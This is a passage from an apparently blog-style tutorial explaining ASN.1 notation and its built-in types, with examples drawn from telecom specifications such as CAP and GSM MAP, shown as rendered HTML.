style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Integer4 ::= INTEGER (0..2147483647)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Interval ::= INTEGER (-1..60000)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">InvokeID ::= InvokeIdType</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">LegID ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    sendingSideID   [0] LegType,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    -- used in operations sent from SCF to SSF</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    receivingSideID [1] LegType</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    -- used in operations sent from SSF to SCF</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">LegType ::= OCTET STRING (SIZE(1))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">ServiceKey ::= Integer4</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Value references have a similar syntax as type references except that
value references must start with a lower-case letter, and also carry
the values type.</p><p>Syntax</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">valueRef Type ::= value</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>For example</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">leg1 LegType ::= '01'H</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">leg2 LegType ::= '02'H</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">highLayerCompatibilityLength            INTEGER ::= 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">minAChBillingChargingLength             INTEGER ::= 0</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h1>Types</h1><p>Now when we have talked a bit about naming references, and how to
assign values and types I'll go over which built-in types exist, and
how to create new types.</p><p>There are some common types, each consists of a type reference and a
tag number.  The tag number is used to identify it when sending the
type in the network.  The universal tags are specified in <a href="https://www.itu.int/rec/T-REC-X.680/en" target="_blank" rel="noopener noreferrer">ITU-T
X.680</a></p><p>Here is a list of the most common types</p><table><thead><tr><th>Type</th><th>Universal Tag Number</th></tr></thead><tbody><tr><td><a href="#boolean">BOOLEAN</a></td><td>1</td></tr><tr><td><a href="#integer">INTEGER</a></td><td>2</td></tr><tr><td><a href="#bit-string">BIT STRING</a></td><td>3</td></tr><tr><td><a href="#octet-string">OCTET STRING</a></td><td>4</td></tr><tr><td><a href="#null">NULL</a></td><td>5</td></tr><tr><td><a href="#object-identifier">OBJECT IDENTIFIER</a></td><td>6</td></tr><tr><td><a href="#external">EXTERNAL</a></td><td>8</td></tr><tr><td><a href="#real">REAL</a></td><td>9</td></tr><tr><td><a href="#enumerated">ENUMERATED</a></td><td>10</td></tr><tr><td><a href="#string-types">UTF8String</a></td><td>12</td></tr><tr><td><a href="#time-types">TIME</a></td><td>14</td></tr><tr><td><a href="#sequence-of">SEQUENCE (OF)</a></td><td>16</td></tr><tr><td><a href="#set-of">SET (OF)</a></td><td>17</td></tr><tr><td><a href="#string-types">NumericString</a></td><td>18</td></tr><tr><td><a href="#string-types">IA5String</a></td><td>22</td></tr><tr><td><a href="#time-types">UTCTime</a></td><td>23</td></tr><tr><td><a href="#time-types">GeneralizedTime</a></td><td>24</td></tr><tr><td><a href="#string-types">VisibleString</a></td><td>26</td></tr><tr><td><a href="#time-types">DATE</a></td><td>31</td></tr><tr><td><a href="#time-types">TIME-OF-DAY</a></td><td>32</td></tr><tr><td><a href="#time-types">DATE-TIME</a></td><td>33</td></tr><tr><td><a href="#time-types">DURATION</a></td><td>34</td></tr><tr><td></td><td></td></tr><tr><td><a href="#choice">CHOICE</a></td><td>*</td></tr><tr><td><a href="#selection">SELECTION</a></td><td>*</td></tr></tbody></table><p>The common types can be divided into simple and structured types.
Structured types are the composition of multiple types (so called
component types) using one of the following types and keywords
<code>SEQUENCE</code>, <code>SEQUENCE OF</code>, <code>SET</code>, <code>SET OF</code>, <code>CHOICE</code>, and/or
<code>SELECTION</code>.  Note that <code>CHOICE</code> and <code>SELECTION</code> does not <!-- -->[need to]<!-- -->
have their own universal tags, due to those are consisting of other
types.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="basic-types">Basic types<a class="hash-link" href="#basic-types" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="boolean">BOOLEAN<a class="hash-link" href="#boolean" title="Direct link to heading">​</a></h3><p>The <code>BOOLEAN</code> type takes values <code>TRUE</code> or <code>FALSE</code>.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">AudibleIndicator ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    tone       BOOLEAN,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    burstList  [1] BurstList</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Here the value <code>tone</code> of the composit type <code>AudibleIndicator</code> is of
type <code>BOOLEAN</code>. Note: It was one of the cleanest example I could find
of a <code>BOOLEAN</code> in the ASN.1 files we use, because Telco often use a
special "trick" when it comes to booleans in order to save bandwidth,
i.e. the <code>NULL</code> type.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="null">NULL<a class="hash-link" href="#null" title="Direct link to heading">​</a></h3><p>The <code>NULL</code> type is basically a placeholder, where the recognition of a
value is important but the actual value is not.</p><p>In 3GPP it is similar to <code>BOOLEAN</code> in the sense that a defined <code>NULL</code>
value is considered <code>TRUE</code> and if the value is missing it is
considered <code>FALSE</code>. The reason for this is that when sent over the
network with <a href="#encodings">BER encoding</a>, it will take no space because
<code>BOOLEAN</code> is always of length 1 but <code>NULL</code> is always length 0,
i.e. <code>NULL</code> does not contain a value.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CancelArg {PARAMETERS-BOUND : bound} ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    invokeID            [0] InvokeID,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    allRequests         [1] NULL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    callSegmentToCancel [2] CallSegmentToCancel {bound}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>in this example <code>allRequests</code> can be defined (then only the tag is
transmitted) or not at all.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="integer">INTEGER<a class="hash-link" href="#integer" title="Direct link to heading">​</a></h3><p><code>INTEGER</code> takes any of the infinite set of integer values. It can also
have the additional notation that names some of the values.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">GSMMAPOperationLocalvalue ::= INTEGER{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    updateLocation (2),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    cancelLocation (3),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    provideRoamingNumber (4),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    noteSubscriberDataModified (5),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    resumeCallHandling (6),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    insertSubscriberData (7),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    -- rest of the named integers --</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">localvalue1 GSMMAPOperationLocalvalue ::= updateLocation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">localvalue2 GSMMAPOperationLocalvalue ::= 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">localvalue3 GSMMAPOperationLocalvalue ::= -55413459</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>are all valid <code>GSMMAPOperationLocalvalue</code>s.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="enumerated">ENUMERATED<a class="hash-link" href="#enumerated" title="Direct link to heading">​</a></h3><p><code>ENUMERATED</code> has the same interpretation as <code>INTEGER</code> but will hold
specific values only.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">RequestedInformationType ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    callAttemptElapsedTime(0),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    callStopTime(1),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    callConnectedElapsedTime(2),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    calledAddress(3),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    releaseCause(30)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">reqInfoType1 RequestedInformationType ::= callAttemptElapsedTime</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">reqInfoType2 RequestedInformationType ::= 0</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>are both valid values of <code>RequestInformationType</code>, while this is not:</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">notValidReqInfoType RequestedInformationType ::= 4</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="bit-string">BIT STRING<a class="hash-link" href="#bit-string" title="Direct link to heading">​</a></h3><p><code>BIT STRING</code> takes values that are a sequence of zero or more bits. It
can also take an additional notation that name certain bits in the bit
sequence.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">DeferredLocationEventType ::= BIT STRING {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    msAvailable (0) ,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    enteringIntoArea (1),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    leavingFromArea (2),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    beingInsideArea (3) ,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    periodicLDR (4)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} (SIZE (1..16))</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">eventType1 DeferredLocationEventType ::= (msAvailable, beingInsideArea)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">eventType2 DeferredLocationEventType ::= '10010'B</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">eventType3 DeferredLocationEventType ::= '12'H</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>are all valid value definitions of the same bit sequence where the
first and third bits are set, and no other bits are set.  The <code>B</code> stands
for binary representation and <code>H</code> for hexadecimal representation.</p><p>The <code>SIZE</code> is a constraint on the type defining it to be of a specific
length. This keyword comes as an extra notation for many of the
<code>STRING</code> types below (as well as some of the other types).</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="octet-string">OCTET STRING<a class="hash-link" href="#octet-string" title="Direct link to heading">​</a></h3><p>Type <code>OCTET STRING</code> takes values that are an ordered sequence of zero
or more (eight-bit) octets.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">MM-Code ::= OCTET STRING (SIZE (1))</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In the same manner as <code>BIT STRING</code> both values below are valid
instances of <code>MM-Code</code>:</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">iMSI-Attach1 MM-Code ::= '00000010'B</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">iMSI-Attach2 MM-Code ::= '02'H</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>while</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">notValidIMSI-Attach MM-Code ::= '10010'B</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>is not considered a valid value due to it not being a multiple of eight bits.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="object-identifier">OBJECT IDENTIFIER<a class="hash-link" href="#object-identifier" title="Direct link to heading">​</a></h3><p>The <code>OBJECT IDENTIFIER</code> type (shortened <code>OID</code>) names information
objects such as ASN.1 modules. The named information object is a node
on an object identifier tree that is managed at the international
level.</p><p>ETSI for instance is managed by ITU-T
<code>itu-t(0) identified-organization(4) etsi(0)</code></p><div><img src="/img/blog/the-specs-behind-the-specs/etsi_asn1oidtree.gif" alt="ETSI OID tree"></div><p>and as can see in the <code>Modules</code> example version 8 of cap-datatypes is part of ETSI.
<code>CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}</code></p><p>Other root arcs</p><table><thead><tr><th>Root</th><th>Organization</th></tr></thead><tbody><tr><td>0</td><td>ITU-T</td></tr><tr><td>1</td><td>ISO</td></tr><tr><td>2</td><td>joint-iso-itu-t</td></tr></tbody></table><p>The labels are optional and the reference could also be written as <code>{0
4 0 0 1 3 52 7}</code>. Only positive integers are allowed including zero (0).</p><p>Another example comes from the CAP-object-identifiers module in ETSI 129.078.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">tc-Messages OBJECT IDENTIFIER ::=</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    {itu-t recommendation q 773 modules(2) messages(1) version3(3)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">id-CAP OBJECT IDENTIFIER ::=</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     umts-network(1) cap4(22)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">id-ac OBJECT IDENTIFIER ::= {id-CAP ac(3)}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p><code>id-ac</code> is a child of the <code>id-CAP</code> object identifier.</p><p>One could lookup object identifiers by visiting this amazing
<a href="https://oidref.com/" target="_blank" rel="noopener noreferrer">page (oidref.com)</a>.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="external">EXTERNAL<a class="hash-link" href="#external" title="Direct link to heading">​</a></h3><p><code>EXTERNAL</code> represents a value that does not need to be specified as a
ASN.1 type. It carries information on how the data should be interpreted.</p><p>{% raw %}```asn.1
Unidirectional {OPERATION:Invokable, OPERATION:Returnable} ::= SEQUENCE {
dialoguePortion  DialoguePortion OPTIONAL,
components       ComponentPortion{{Invokable}, {Returnable}}
}</p><p>DialoguePortion ::= <!-- -->[APPLICATION 11]<!-- --> EXPLICIT EXTERNAL</p><div class="codeBlockContainer_I0IT language-{% theme-code-block"><div class="codeBlockContent_wNvx {%"><pre tabindex="0" class="prism-code language-{% codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Here the value `dialoguePortion` will have tag 11 if specified, it is</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">then up to the application to decide how to deal with the value.</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">### REAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Values of the type `REAL` will take a triplet of numbers (m, b, e),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">where m is the mantissa (a signed number), b the base (2 or 10), and e</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">the exponent (a signed number).</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">There are also three special values it can take `PLUS-INFINITY`, 0,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">and `MINUS-INFINITY`.</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">```asn.1</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">theBestRealValue REAL ::= (123, 10, -2) -- 1.23</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">maxValue REAL ::= PLUS-INFINITY</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="string-types">String types<a class="hash-link" href="#string-types" title="Direct link to heading">​</a></h3><p>I feel like most of the string types are the same, except that they
all take diffrent character sets. I've already described <code>BIT STRING</code>
and <code>OCTET STRING</code> which both operate the bit set, but there is a
lot of others that operate over character sets.</p><table><thead><tr><th>Type</th><th>Tag</th><th>Character set regex/comment</th></tr></thead><tbody><tr><td>UTF8String</td><td>12</td><td>Synonymous with UniversalString at abstract level</td></tr><tr><td>NumericString</td><td>18</td><td><code>[0-9 ]</code></td></tr><tr><td>PrintableString</td><td>19</td><td><code>[A-Za-z0-9'()+,./:=? -]</code></td></tr><tr><td>TelexString (T61String)</td><td>20</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> reg. #6, #87, #102, #103, #106, #107, #126, #144, #150, #153, #156, #164, #165, #168 + space,delete</td></tr><tr><td>VideotexString</td><td>21</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> reg. #1, #13, #72, #73, #87, #89, #102, #108, #126, #128, #129, #144, #150, #153, #164, #165, #168 + space,delete</td></tr><tr><td>IA5String</td><td>22</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> reg. #1, #6 + space,delete</td></tr><tr><td>GraphicString</td><td>25</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> graphical sets (called 'G') + space</td></tr><tr><td>VisibleString (ISO646String)</td><td>26</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> reg. #6 + space</td></tr><tr><td>GeneralString</td><td>27</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> graphical sets (called 'G'), control characters (called 'C') + space,delete</td></tr><tr><td>UniversalString</td><td>28</td><td>[ISO10646-1]</td></tr><tr><td>BMPString</td><td>30</td><td>Basic Multilingual Plane; subtype of UniversalString</td></tr></tbody></table><p><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a>
is a pretty good source, it reference most of the registers but not
all of them as far as I can see.</p><p>I'll list some examples of string types found in our ASN.1 files:</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">AMFNameUTF8String ::= UTF8String (SIZE(1..150, ...))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DirectoryString ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    teletexString TeletexString (SIZE (1..maxSize)),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    printableString PrintableString (SIZE (1..maxSize)),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    universalString UniversalString (SIZE (1..maxSize)),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    bmpString BMPString (SIZE (1..maxSize))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">--    utf8String UTF8String (SIZE (1..maxSize))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DisplayInformation ::= IA5String (SIZE (minDisplayInformationLength..maxDisplayInformationLength))</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p><code>IA5String</code> is used to represent ISO 646 (IA5; International Alphabet 5)
characters.  The entire character set contains precisely 128
characters and are generally equivalent to the first 128 characters of
the ASCII alphabet.</p><p>There are multiple formats for the values of <code>UniversalString</code>, <code>BMPString</code> and
<code>UTF8String</code> types. One could either specify a quadruple with <code>{group,
plane, row, cell}</code> for the character needed, or an array of defined values (strings).</p><p>An example from Dubuisson:</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">latinCapitalLetterA UniversalString ::= {0,0,0,65}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">greekCapitalLetterSigma UniversalString ::= {0,0,3,145}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">my-string UniversalString ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    "This is a capital A: ", latinCapitalLetterA,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ", and a capital alpha: ", greekCapitalLetterAlpha,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    "; try and spot the difference!"}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>And X.680 gives us yet another example</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">IMPORTS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  BasicLatin, greekCapitalLetterSigma</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  FROM ASN1-CHARACTER-MODULE</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    { joint-iso-itu-t asn1(1) specification(0) modules(0) iso10646(0) };</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"> MyAlphabet ::= UniversalString (FROM (BasicLatin | greekCapitalLetterSigma))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"> mystring MyAlphabet ::= { "abc" , greekCapitalLetterSigma , "def" }</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="time-types">Time types<a class="hash-link" href="#time-types" title="Direct link to heading">​</a></h3><p>The <code>UTCTime</code> and <code>GeneralizedTime</code> types are actually specified as
